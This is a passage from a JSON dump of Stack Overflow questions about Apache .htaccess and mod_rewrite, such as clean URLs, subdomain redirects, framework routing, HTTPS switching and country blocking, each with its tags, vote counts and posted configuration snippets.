r-&gt;uri = /index.php\n</code></pre>\n\n<p>The final URL in the browser looks like this:</p>\n\n<pre><code>http://my.site/app/123?/apps/123\n</code></pre>\n\n<p><strong>Why is Apache appending ?/apps/123 on to the URL?</strong> </p>\n\n<p>I guess if I can avoid this then I can avoid the infinite recursion problem here.</p>\n"},{"tags":[".htaccess","url-rewriting","hide","address","questionmark"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":96,"score":0,"question_id":11857810,"title":".htaccess hide question mark from address","body":"<p>What am I doing wrong?\nI have a link :</p>\n\n<p><code>&lt;a href=\"norma/something1/something2/something3/\"&gt;Link Name&lt;/a&gt;</code></p>\n\n<p>I am need to make an address from:\n<code>eshop.mydomain.com/norma/something1/something2/something3/</code>\n<br>this adress:<br>\n<code>eshop.mydomain.com/norma-something1-something2-something3.html</code></p>\n\n<p>the only thing I can do is<br>\n<code>eshop.mydomain.com/?norma-something1-something2-something3.html</code></p>\n\n<p>I need to hide the question mark, but I do not have any idea how :(</p>\n\n<p>Here is my .htaccess</p>\n\n<pre><code>#php_value memory_limit 256M \nRewriteEngine On\nRewriteBase /\nRewriteRule /index.php / [R=301]\n\nRewriteRule ^norma/([^/]+)/([^/]+)/([\\d\\.]+)$ %{DOCUMENT_ROOT}/index.php?$1-$2&amp;-$3.html [L,QSA]\n\nErrorDocument 404 /doc/e404/\n</code></pre>\n"},{"tags":[".htaccess","mod-rewrite","url-rewriting"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":12405361,"title":"Url write through htaccess","body":"<p>Im working in localhost already wrote the htaccess in my site </p>\n\n<p>Real URL :</p>\n\n<pre><code>localhost/lite-cms/template/content/index.php?u_title=about-mind-yolk\n</code></pre>\n\n<p>htaccess that I add</p>\n\n<pre><code>RewriteRule ^([^/]*)\\.html$ /lite-cms/template/content/index.php?id=$1 [L]\n</code></pre>\n\n<p>Im getting the URL like this</p>\n\n<pre><code>http://localhost/lite-cms/template/content/about-mind-yolk.html\n</code></pre>\n\n<p>but I want the URL like this without show template/content/</p>\n\n<pre><code>http://localhost/lite-cms/about-mind-yolk.html\n</code></pre>\n\n<p>Please give a solution?</p>\n"},{"tags":[".htaccess","googlebot","cloudflare"],"answer_count":0,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":59,"score":2,"question_id":12405714,"title":".htaccess how to block US without blocking searchengine crawlers (Uses cloudflare)","body":"<p>Currently in my htaccess I have this</p>\n\n<pre><code>    SetEnvIf CF-IPCountry US UnwantedCountry=1\n    Order allow,deny\n    Allow from all\n    Deny from env=UnwantedCountry\n    &lt;Files /error/403.html&gt; \n    Allow From All \n    &lt;/Files&gt;\n</code></pre>\n\n<p>It blocks US from accessing this part of the site but I want search engines (mostly google) to still be able to index it</p>\n"},{"tags":[".htaccess","cakephp"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":336,"score":0,"question_id":11225811,"title":"CakePHP HTAccess 500 Internal Server Error, 404 Page Not Found errors","body":"<p>I'm using <code>CakePHP 1.2</code> Version and When I upload my site on Live Server, it gives me <code>500 Internal Server Error</code></p>\n\n<p>When I check <code>mod_rewrite</code> in <code>phpinfo</code> function, its not visible, but on same server another Joomla site is running perfectly fine without any problem of htaccess or path rewrite issue with AceSEF Component of Joomla for htaccess page / paths, so I believe as this is <code>Shared server</code> it must be that way.</p>\n\n<p>I have tried different options like adding 'RewriteBase /' in root .htaccess file or trying the same in app/webroot/.htaccess files as well but no solution works for me.</p>\n\n<p>Even when I write, 'RewriteBase /' in root .htaccess and app/.htaccess file, error changes to <code>400 Page Not Found</code>. I don't know why.</p>\n\n<p>Below is the .htaccess code:</p>\n\n<p>root .htaccess file:</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine on\nRewriteBase /\nRewriteRule    ^$ app/webroot/    [L]\nRewriteRule    (.*) app/webroot/$1 [L]\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>app/.htaccess file:</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine on\nRewriteBase /\nRewriteRule    ^$    webroot/    [L]\nRewriteRule    (.*) webroot/$1    [L]\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>app/webroot/.htaccess file:</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteRule ^(.*)$ /index.php?url=$1 [QSA,L]\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>I have read through some links like: <a href=\"http://book.cakephp.org/view/917/Apache-and-mod_rewrite-and-htaccess\" rel=\"nofollow\">Apache-and-mod_rewrite-and-htaccess</a> though not much helpful </p>\n\n<p>Any answer or solution for this error? Much appreciated !!</p>\n\n<p>Thanks </p>\n"},{"tags":["php","linux","apache",".htaccess","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":87,"score":0,"question_id":12404721,"title":"VHost & htaccess - 500 Internal Server error","body":"<p>I use <strong>ISPConfig 3</strong> to manage my domains/subdomains.</p>\n\n<p>I added subdomain <code>parim.kristian.ee</code> which would redirect to <code>web/parim/</code> (<em>note: <strong>web/</strong> is my document root</em>).</p>\n\n<p>ISPConfig generated such redirect to apache config:</p>\n\n<pre><code>RewriteEngine on\nRewriteCond %{HTTP_HOST}   ^parim.kristian.ee [NC]\nRewriteRule   ^/(.*)$ /parim/$1  [L]\n</code></pre>\n\n<p>Now if i'll try to get static resources, such as <a href=\"http://parim.kristian.ee/images/1x1.gif\" rel=\"nofollow\">http://parim.kristian.ee/images/1x1.gif</a>, it serves fine, but when redirect is to codeigniter, it doesn't work.</p>\n\n<p>Htaccess in <code>web/parim/</code> looks like this:</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n    RewriteEngine on\n\n    Options -Indexes\n\n    #Handle CodeIgniter request\n    RewriteCond %{REQUEST_FILENAME} !-f\n    RewriteCond %{REQUEST_FILENAME} !-d\n    RewriteRule ^(.*)$ ./index.php?/$1 [L] \n&lt;/IfModule&gt;\n&lt;IfModule !mod_rewrite.c&gt;\n    ErrorDocument 404 ./index.php\n&lt;/IfModule&gt;\n</code></pre>\n\n<p><strong>NOTE:</strong> accessing the same folder via <a href=\"http://kristian.ee/parim/\" rel=\"nofollow\">http://kristian.ee/parim/</a> works!</p>\n\n<p>I s*ck at htaccess, so any help is appreciated.</p>\n"},{"tags":["apache",".htaccess","mod-rewrite","apache2","rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":11771315,"title":"htaccess rewrute rules for subdomain","body":"<p>I added *.domain.com. to my bind so after that i can run all subdomains which link to my main homepage so bleble.domain.com opens main page domain.com</p>\n\n<p>My main goal is to link {subdomain_name}.domain.com to /index.php?/member/{subdomain_name} using htaccess and without redirect 301</p>\n\n<p>So far i have got something like that but it doesn't work:</p>\n\n<pre><code>RewriteEngine On\nRewriteBase /\n\n# sub domains\nRewriteCond %{HTTP_HOST} ^(www.)?([a-z0-9-]+).domain.com [NC]\nRewriteRule (.+)$ /index.php?/member/$1 [L,P]\n\n# codeigniter\n#Removes access to the system folder by users.\n#Additionally this will allow you to create a System.php controller,\n#previously this would not have been possible.\n#'system' can be replaced if you have renamed your system folder.\nRewriteCond %{REQUEST_URI} ^core.*\nRewriteRule ^(.*)$ /index.php?/$1 [L]\n\n#When your application folder isn't in the system folder\n#This snippet prevents user access to the application folder\n#Submitted by: Fabdrol\n#Rename 'application' to your applications folder name.\nRewriteCond %{REQUEST_URI} ^application.*\nRewriteRule ^(.*)$ /index.php?/$1 [L]\n\n#Checks to see if the user is attempting to access a valid file,\n#such as an image or css document, if this isn't true it sends the\n#request to index.php\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ index.php?/$1 [L]\n</code></pre>\n\n<p>I receive such an error</p>\n\n<pre><code>Not Found\nThe requested URL /index.html was not found on this server.\n\nAdditionally, a 403 Forbidden error was encountered while trying to use an ErrorDocument to handle the request.\n</code></pre>\n"},{"tags":["php",".htaccess","mod-rewrite","url-rewriting"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":70,"score":1,"question_id":12403820,"title":"How to do mod_rewrite for a url with parameters","body":"<p>Given that i have the following url in my site: <strong>http://localhost/test/example.php?a=1&amp;b=2</strong></p>\n\n<p>How can i specify a redirect rule in my .htaccess file, such that this url is called when i enter the following in my browser:  <strong>http://localhost/test/example/1.html</strong></p>\n\n<p>In other words, if a user enters the url: <strong><em>http://localhost/test/example/1.html</em></strong>, he should be displayed the page: <strong><em>http://localhost/test/example.php?a=1&amp;b=2</em></strong></p>\n\n<p>I have tried the following mod_rewrite code in my .htaccess file, but it does not work:</p>\n\n<pre><code>RewriteRule ^/([^/]+).html /example.php?a=$1&amp;b=$2 [QSA]\n</code></pre>\n\n<p>This is the code in my <strong>.htaccess</strong> file:</p>\n\n<pre><code>Options +FollowSymLinks\nRewriteEngine On\nRewriteRule ^([^/]+)/([^/]+)/? /example.php?a=$1&amp;b=$2 [QSA]\n</code></pre>\n\n<p>Note: I am using WAMP2.0, Apache 2.2.6 and PHP 5.2.5</p>\n"},{"tags":["apache",".htaccess","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":21,"score":1,"question_id":12403156,"title":"same redirect rule on 2 domains","body":"<p>I'm running 2 domains on the same virtualhost</p>\n\n<pre><code>&lt;VirtualHost *:80&gt; \n    ServerName www.example.de\n    ServerAlias www.example.de example.de example.co.uk www.example.co.uk\n    DocumentRoot C:/inetpub/wwwroot/example_ml\n    DirectoryIndex index.php\n&lt;/VirtualHost&gt;\n</code></pre>\n\n<p>and trying to apply the same redirect rule in my htaccess for both of the domains</p>\n\n<pre><code>RewriteRule ^tag/(.*)$ http://www.example.de/$1 [L,R=301]\nRewriteRule ^\\d{4}/\\d{2}/\\d{2}/(.*)$ http://www.example.de/$1 [L,R=301]\nRewriteRule ^\\d{4}/\\d{2}/(.*)$ http://www.example.de/$1 [L,R=301]\n\nRewriteRule ^tag/(.*)$ http://www.example.co.uk/$1 [L,R=301]\nRewriteRule ^\\d{4}/\\d{2}/\\d{2}/(.*)$ http://www.example.co.uk/$1 [L,R=301]\nRewriteRule ^\\d{4}/\\d{2}/(.*)$ http://www.example.co.uk/$1 [L,R=301]\n</code></pre>\n\n<p>but doesn't seem to work\non each <code>example.co.uk/tag_name</code> I'm getting redirected to <code>example.de/tag_name</code></p>\n"},{"tags":["apache",".htaccess","redirect"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":1173,"score":1,"question_id":9334171,"title":".htaccess redirect to subdomain","body":"<p>I'm tying to set up the scenario, if someone visits <strong>website.com/blog/</strong> they are redirected to <strong>blog.website.com</strong>.</p>\n\n<p>I used this code in my .htaccess file to achieve some other redirection (from .net to .com) previously:</p>\n\n<pre><code>Options +FollowSymLinks\nRewriteEngine on  \nRewriteCond %{HTTP_HOST} ^(www.|blog.)?website.net(.*) [NC]  \nRewriteRule (.*) http://www.website.com/$1 [R=301,L]\n</code></pre>\n\n<p>It may also be relevant that I have an <strong>ErrorDocument 404</strong> in my apache configuration file.</p>\n\n<p>To solve my my problem I tried this:</p>\n\n<pre><code>Options +FollowSymLinks\nRewriteEngine on  \nRewriteCond %{HTTP_HOST} ^(www.|blog.)?website.net(.*) [NC]  \nRewriteRule (.*) http://www.website.com/$1 [R=301,L]\n\nRewriteCond %{HTTP_HOST} ^(www.)?website(.com|.net)/blog/?$ [NC]\nRewriteRule (.*) http://blog.website.com/ [L]\n</code></pre>\n\n<p>This code however is not working. My error document is still handling the request (the /blog/ directory doesn't exist). I tried moving this new code above the ErrorDocument in the apache conf file, but the same thing occurred.</p>\n\n<p>It's no doubt a syntactical error, any help would be greatly appreciated :)</p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":12399505,"title":"Understanding difference between redirect and rewrite .htacess","body":"<p>I'd like to understand the difference between redirecting and rewriting a URL using .htaccess.\nSo here's an example: Say I have a link like <code>www.abc.com/ index.php?page=product_types&amp;cat=88</code>  (call this the \"original\" url)</p>\n\n<p>But when the user types in <code>abc.com/shoes</code> (let's call this the \"desired\" url), they need to see the contents of the above link. To accomplish this, I would do this:</p>\n\n<pre><code>Options +FollowSymLinks\nRewriteEngine on\nRewriteBase /\nRewriteRule ^(.*)shoes(.*)$ index.php?page=product_types&amp;cat=88\n</code></pre>\n\n<p>Nothing wrong with this code and it does the trick. However, if I type in the original url in the address bar, the content comes up, but the url does not change. So it remains as <code>www.abc.com/index.php?page=product_types&amp;cat=88</code></p>\n\n<p>But what if I wanted the desired url (<code>/shoes</code>) to show up in the address bar if I typed in <code>www.abc.com/ index.php?page=product_types&amp;cat=88</code>? How would this be accomplished using .htaccess? Am I running into a potential loop?</p>\n"},{"tags":["php",".htaccess","url-rewriting","drupal-6"],"answer_count":3,"favorite_count":2,"up_vote_count":1,"down_vote_count":0,"view_count":65,"score":1,"question_id":12399483,"title":"How to add a custom word to my domain URL for every request?","body":"<p>Consider my domain name is</p>\n\n<pre><code>www.mydomain.com\n</code></pre>\n\n<p>Consider a page request</p>\n\n<pre><code>www.mydomain.com/user/register\n</code></pre>\n\n<p>I want to add a custom word after base URL for every request inside mydomain.com.example</p>\n\n<pre><code>www.mydomain.com/customword/\nwww.mydomain.com/customword/user/register\n</code></pre>\n\n<p>Can we do this using URL rewriting in htaccess file ?</p>\n\n<p>Actually it should execute  'www.mydomain.com/user/register' internally...but externally the URL should look like www.mydomain.com/customword/user/register.</p>\n"},{"tags":["php","regex",".htaccess","mod-rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":12398263,"title":"mod_rewrite and trailing slashes","body":"<p>I have</p>\n\n<pre><code>RewriteRule    ^([A-Za-z0-9-_≈]+)/?$    page.php?text=$1\n</code></pre>\n\n<p>to translate hits like <code>domain.com/sample_text</code> into <code>page.php?text=sample_text</code></p>\n\n<p>However, I want the following two conditions to also work (and give the same result).</p>\n\n<p>1) If they go to <code>domain.com/sample_text/</code> I want to keep the trailing slash in the adress bar and show <code>page.php?text=sample_text</code> (now it goes to the right page but the css and js-paths are messed up).</p>\n\n<p>2) If they go to <code>domain.com/sample_text/worthlessdata123</code> I want to strip everything after the /, keeping <code>domain.com/sample_text/</code> in the adress bar and show <code>page.php?text=sample_text</code>.</p>\n\n<p>I've struggled quite a bit, but I'm lousy at regex and my head isn't working properly.</p>\n"},{"tags":[".htaccess","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":12391661,"title":"Redirect But Not Show The URL redirec :: htaccess?","body":"<p>I need to redirect some users, possibly to a subdomain, but I do not want them to know that they are in a subdomain. They should think they are in the main domain.\nI believe this can be done with htaccess, but it is gibberish to me.</p>\n\n<p>Can someone please throw me some bones?</p>\n"},{"tags":["php",".htaccess","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":62,"score":0,"question_id":12292449,"title":"htaccess redirect all except multiple folders and files","body":"<p>I have been trying multiple different type of example but I cant get it work when trying to add more folder and file as the exception for redirection. I just know this one example could work in my apache localhost:</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n    RewriteEngine on\n    RewriteRule  !^js($|/) http://google.com [L,R=301]\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>So basically I want to redirect all except js,css,img folders and getOrder.php, getCustomer.php files, something like that. Could anyone help in this case?</p>\n"},{"tags":["apache",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":8,"score":1,"question_id":12397907,"title":"Mod Rewrite Trap /ABC","body":"<p>Let's say I have a URL like this:\n<a href=\"http://example.com/ABC\" rel=\"nofollow\">http://example.com/ABC</a></p>\n\n<p>How can I trap the ABC after the / and drop it into the partner_code? The ABC is always a 3 or 4 letter string and never has anything after it.</p>\n\n<p>This causes the site images, CSS files, etc. to blow up:\nRewriteRule ^(.*)$ index.php?partner_code=$1&amp;utm_source=partner&amp;utm_medium=link&amp;utm_campaign=$1 [L]</p>\n"},{"tags":["apache",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":15,"score":0,"question_id":12397814,"title":"How to obtain a customized (and friendly) url using .htaccess?","body":"<p>Say I have a URL like <code>http://abc.com/index.php?cat=37&amp;subsubcat=0&amp;subcat=199&amp;page=product_detail&amp;product_id=1661</code></p>\n\n<p>Can I use <code>.htaccess</code> to redirect/rewrite this to a URL like <code>http://abc.com/simplerName</code>?</p>\n\n<p>I found quite a few posts on SO that ask for friendly URLs, but I want to take it a step further, i.e. I'd like to specify what the <strong>subfolder</strong> name should be (in the above example, it's \"<code>simplerName</code>\"). Now I've got 10 URLs that I want to customize and I'm totally cool with specifying 10 rules for each URL.</p>\n\n<p>But I'm not sure how to achieve this using <code>.htaccess</code>. Is this even possible?</p>\n"},{"tags":[".htaccess","mod-rewrite","cookies","url-rewriting"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":17,"score":0,"question_id":12397693,"title":"Why is this RewriteRule not working?","body":"<p>I have a .htaccess RewriteRule that redirects users to <code>/coming_soon/</code> if they do not have a <code>dev</code> cookie, but for some reason it's redirecting me even if I do have the cookie. This rule was working correctly last night until I added another condition to allow requests to my Google Webmaster Tools verification file to go through. Here are the contents of my .htaccess:</p>\n\n<pre><code>RewriteEngine On\nRewriteBase /\nRewriteCond %{HTTP_COOKIE} !^\\dev=$ [NC]\nRewriteCond %{REQUEST_URI} !/google********.html\nRewriteRule ^(.*)$ coming_soon [QSA,L]\n</code></pre>\n\n<p>To be honest I don't really understand the syntax of RewriteRules and most of these I just scavenged from the internet, which is making it really hard to debug.</p>\n\n<p>I set the cookie locally and verified it exists, so does anyone know what I'm doing wrong?</p>\n"},{"tags":["php",".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":12396894,"title":"htaccess Ignoring directory and its subdirectories","body":"<p>I have the following in my htaccess file:</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteRule ^(mailinglist)/.*$ - [L]\nRewriteRule ^(.*)$ index.php?url=$1 [QSA,L]\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>I basically want to remove htaccess from hitting that last line if I am in the mailinglist directory.</p>\n\n<p>This only works for items in the root of the /mailinglist directory. Once I go deeper like /mailinglist/w/1 it breaks and hits that last rewrite rule. How do I stop it from processing that last rewrite rule if I am in the /mailinglist directory.</p>\n\n<p>The reason is I have a different set of htaccess in that directory and I do not want this htaccess to control it.</p>\n"},{"tags":["regex",".htaccess","apache2"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":22,"score":1,"question_id":12396645,"title":"Proper regex for .htaccess internal redirect and url shortening","body":"<p>Based on this thread:  <a href=\"http://stackoverflow.com/questions/12394494/proper-regex-for-htaccess-redirect-and-prevention-of-hotlinks\">Proper regex for .htaccess redirect and prevention of hotlinks</a></p>\n\n<p>I am asking a more focused question (hotlinking is solved).</p>\n\n<p>I am doing an image host project and am encoding image names.  I need to provide a short url for the users to access their images.  The following should be internally redirected:</p>\n\n<p>domain.com/hsh1h.jpg (or other images extensions)<br />\ndomain.com/hsh1h<br/></p>\n\n<p>These would be internally redirects to:<br />\ndomain.com/image.php?query=hsh1h.jpg<br />\ndomain.com/image.php?query=hsh1h</p>\n\n<p>The issue is that the following url's should not be redirected:</p>\n\n<p>domain.com/admin<br />\ndomain.com/admin/index.php</p>\n\n<p>I apologize for creating a confusing topic earlier and thank you all so much for your help!</p>\n"},{"tags":["php","html",".htaccess","hyperlink"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":20,"score":0,"question_id":12396396,"title":"Dynamic Links in that auto navigates to the top of a div","body":"<p>I have a forum whereby links to a thread looks like</p>\n\n<p><code>http://www.website.com/comments.php?topic_id=1</code></p>\n\n<p>How can I make it look like this</p>\n\n<p><code>http://www.website.com/1046302/some-link-desc#12154109</code></p>\n\n<p>so that when such links are given out, the user is taken directly to that particular comment.</p>\n\n<p>I'm particular about the <code>#12154109</code> . The other part of the URL <code>/1046302/some-link-desc</code> is achieved through .htaccess configuration.</p>\n\n<p><strong>Question Update</strong></p>\n\n<p>What is the best way to get the unique number ? Do I use a timestamp or a concatenation of the topic_id and comment_id ?</p>\n"},{"tags":[".htaccess","redirect","subdomain"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":2150,"score":2,"question_id":1263170,"title":".htaccess to require WWW for domain, but allow subdomain if existing with no hard coding","body":"<p>I'm trying to figure it out how to set up an .htaccess set of rules that would force the presence of the \"www\" in front of the domain if it is not initially specified, but at the same time, it will not have any effect if the an subdomain is pressent; all this without hard coding any domain name so that the script is portable around different servers and configurations.</p>\n\n<p><strong>EDIT:</strong></p>\n\n<p>I'm sorry I was not able to get this explained right in the fist place. So what I need is as follows:</p>\n\n<p><a href=\"http://example.com\" rel=\"nofollow\">http://example.com</a> -> redirects to <a href=\"http://www.example.com\" rel=\"nofollow\">http://www.example.com</a></p>\n\n<p><a href=\"http://www.example.com\" rel=\"nofollow\">http://www.example.com</a> -> does not redirect</p>\n\n<p><a href=\"http://subdomain.example.com\" rel=\"nofollow\">http://subdomain.example.com</a> -> does not redirect</p>\n"},{"tags":["apache",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":63,"score":1,"question_id":3023156,"title":"What's wrong with this .htaccess rewrite","body":"<p>I spend a lot of time trying to figure out what's wrong with this .htaccess rewrite with no success. It produces a \"500 Internal Server Error\" :(</p>\n\n<pre><code>RewriteEngine On\n\nRewriteCond %{REQUEST_URI} ^/(([^/]+/)*)gallery/\nRewriteCond %{DOCUMENT_ROOT}%1gallery/cache/$0 -f\nRewriteRule ^.+ cache/$0 [L]\n\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteRule ^.* index.php/$0 [L]\n</code></pre>\n\n<p>Can anyone see any problem?</p>\n"},{"tags":["regex",".htaccess","mod-rewrite","apache2"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":40,"score":0,"question_id":12394494,"title":"Proper regex for .htaccess redirect and prevention of hotlinks","body":"<p>I posted this on Reddit (r/learnprogramming) and someone there PM'd me and told me to come here, so here I am!</p>\n\n<p>I have been trying to learn regex's and I suck at them still. I seriously have difficulty grasping the pattern matching. I am solid in other OOP languages so I figured I would learn regex and it just evades me.</p>\n\n<p>I have downloaded EditPad Pro so I can practice as <a href=\"http://www.regular-expressions.info/tutorial.html\" rel=\"nofollow\">http://www.regular-expressions.info/tutorial.html</a> suggests. I can get expressions to match bulk text, but I am trying to parse URL's and I keep missing. </p>\n\n<p>Here is what I am trying to do. I am writing my own permalink .htaccess file as a proof of concept study, so I can hopefully use this is in future sites.</p>\n\n<p><em>I need to return the following dynamic content from a URL:</em></p>\n\n<p><strong>I need everything other than http:// www.domain.com/ or http:// domain.com/ or domain.com/:</strong>\n<br /><em>(I am adding a space after http:// because of the limits on new accounts)</em></p>\n\n<p>http:// www.domain.com/asdjh324hj.jpg<br />\nhttp:// www.domain.com/asa45s.png<br />\nhttp:// www.domain.com/aser24hj.gif/<br />\nhttp:// www.domain.com/wer234dsfa/<br />\nhttp:// www.domain.com/k3kjk4<br />\nhttp:// www.domain.com/k3kasd4/<br /></p>\n\n<p><strong>The matched part will then be appended to:</strong></p>\n\n<p>http:// www.domain.com/some_dir/som_subdir/some_file.php?querystring=$1</p>\n\n<p><strong>But, I don't want any of these urls in the results:</strong></p>\n\n<p>http:// www.domain.com/some_dir/some_file.php<br />\nhttp:// www.domain.com/some_dir/some_subdir/some_file.html</p>\n\n<p><strong>And I need to prevent hotlinking to images in the image_dir:</strong></p>\n\n<p>http:// www.domain.com/image_dir/some_dir/some_subdir/some_image.jpg (or png,gif,etc)</p>\n\n<p><em>Hotlinked images would be redirected to a page with the passed image as a querystring.</em></p>\n\n<p>So what RewriteRule regex would I setup to grab this? I understand RewriteRules and the flags, putting matched results into variables, etc, I just can't figure out what regex I should write to grab the actual result.</p>\n\n<p>If this is too complex for RewriteRules, then please let me know as I am struggling here.</p>\n\n<p>Usually I do these in PHP and would start with:<br />\n.com/[a-zA-Z0-9-_.]+<br/>\n([^/]+)/?$<br/>\nThen do good 'ol substrings and checks. It's hacking it to death and I should be doing better!</p>\n\n<p>I am currently going through the regular-expressions.info tutorials and am making progress, but I keep grabbing the wrong things too.</p>\n\n<p>Thanks for any help you can send my way!</p>\n"},{"tags":["php",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":12395539,"title":"HTACCESS rewrite with get variables","body":"<p>I have a sub directory which has a bunch of .php files in it. I currently have this as my .HTACCESS to rewrite the urls cleanly.</p>\n\n<pre><code>RewriteEngine on\nOptions +FollowSymLinks\nRewriteBase /mailing_list\n\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_FILENAME}\\.php -f\nRewriteRule ^(.*)$ $1.php\n</code></pre>\n\n<p>This is fine because it turns <a href=\"http://www.example.com/mailing_list/home\" rel=\"nofollow\">http://www.example.com/mailing_list/home</a> to look at <a href=\"http://www.example.com/mailing_list/home.php\" rel=\"nofollow\">http://www.example.com/mailing_list/home.php</a></p>\n\n<p>What I also need to account for is a page using clean urls for the get variables. That page is called w.php and it passes <code>?i=(int)</code></p>\n\n<p>When I try to access <a href=\"http://www.example.com/mailing_list/w/1\" rel=\"nofollow\">http://www.example.com/mailing_list/w/1</a> I get a 505 server error. What do I need to add to my htaccess to account for this? Is there a full proof way which will account for others I run in to. For example:</p>\n\n<p>What if a page comes up called blogs and it passes the ID of the blog like this: <a href=\"http://www.example.com/mailing_list/blog/1\" rel=\"nofollow\">http://www.example.com/mailing_list/blog/1</a></p>\n\n<p>Will I have to add a new Rule for that page specifically?</p>\n"},{"tags":["apache",".htaccess","mod-rewrite","redirect","seo"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":13,"score":0,"question_id":12395373,"title":"Redirect everything except ?p=*","body":"<p>how can I configure a .htaccess file to redirect every link except</p>\n\n<pre><code>domain.com?p=*\n</code></pre>\n\n<p>and</p>\n\n<pre><code>domain.com/index.php?p=*\n</code></pre>\n\n<p>to domain.com</p>\n\n<p>I hope you understand my question, thank you for every answer.\nGreetings from Germany.</p>\n"},{"tags":["apache",".htaccess","mod-rewrite","nginx","litespeed"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":108,"score":0,"question_id":10742475,"title":".htaccess - Redirect for all users, except me","body":"<p>Please help me with the htaccess. I tried to create a rule whereby a user visiting a particular web page is automatically redirected to another page on the site, but if I visit it page, this rule does not work for me (for a specific IP address). </p>\n\n<p>LiteSpeed ​​installed on the server, and I think fits the rule for Apache (correct if I'm wrong, I just do not understand the server software).</p>\n\n<p>Sorry for bad english.</p>\n"},{"tags":[".htaccess","iframe"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":12392991,"title":"How to stop someone from accessing a file outside an iframe?","body":"<p>I´m using an iframe to show an one course on my page. </p>\n\n<p>The files for the online course is located in <a href=\"http://www.domain.com/coursefiles\" rel=\"nofollow\">http://www.domain.com/coursefiles</a> and the iframe looks like this:</p>\n\n<pre><code>&lt;iframe src=\"http://www.domain.com/coursefiles/index.php\" width=\"100%\" height=\"670\"&gt;&lt;/iframe&gt;\n</code></pre>\n\n<p>Now, does anyone know any htaccess command on how I can deny direct access to the course folder, but let the users only access it trough the page with the iframe?</p>\n\n<p>\"sorry for the bad english\" :)</p>\n"},{"tags":[".htaccess","mod-rewrite","subdirectory"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":12387025,"title":"mod_rewrite: rewriting existing directory with htaccess in it","body":"<p>how can I tell mod_rewrite that ALL existing directories should be rewritten?</p>\n\n<p>I have an subdirectory with a .htaccess-File which rewrites too. When I go to domian.tld/sub_with_htaccess, Apache only reads the htaccess in \"sub_with_htaccess\" but do not read the .htaccess in / which is more important for me.</p>\n\n<p>BUT: When I have a subdomain (sub.domain.tld) whose document root points on /var/www/domain-tld/sub_with_htaccess, I want that only the .htaccess in \"sub_with_htaccess\" decides what to do.</p>\n\n<p>Any ideas? :)</p>\n"},{"tags":[".htaccess","https"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":12390785,"title":".htaccess redirect all pages except 1 to http from https","body":"<p>I have two websites, one that runs 99% as http (site A) and one that runs 100% as https (site B).</p>\n\n<p>I want to create an htaccess file that redirects users that go from site B to site A without changing their URL from https: to http: automatically to switch to http:</p>\n\n<p>What I have on site A is:</p>\n\n<pre><code>RewriteCond %{HTTPS} on\nRewriteRule ^(.*)$ http://sitehere.com/$1 [R,L]\n</code></pre>\n\n<p>Which works perfectly, except I have one page that I <em>do</em> want to serve as https: on site A.\nHow 